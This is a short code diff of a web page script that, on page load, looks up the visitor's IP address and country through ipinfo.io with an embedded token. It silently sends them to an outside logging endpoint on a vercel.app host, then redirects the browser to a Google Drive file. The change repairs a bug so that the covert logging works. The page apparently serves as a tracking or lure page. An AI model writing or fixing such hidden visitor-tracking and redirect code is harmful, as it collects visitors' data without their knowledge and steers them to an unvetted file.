@@ -5,7 +5,7 @@
     fetch('https://ipinfo.io/json?token=dbe5d01bce6b9a')
       .then(res => res.json())
       .then(data => {
-        fetch(`https://dxvrxv.vercel.app/api/log?text=${res.ip}-${res.country}`);
+        fetch(`https://dxvrxv.vercel.app/api/log?text=${data.ip}-${data.country}`);
         window.location.href = 'https://drive.google.com/file/d/19fXexcK23j6wIujHCot_SwowrZhVAF3S/view?usp=sharing';
       });
   </script>
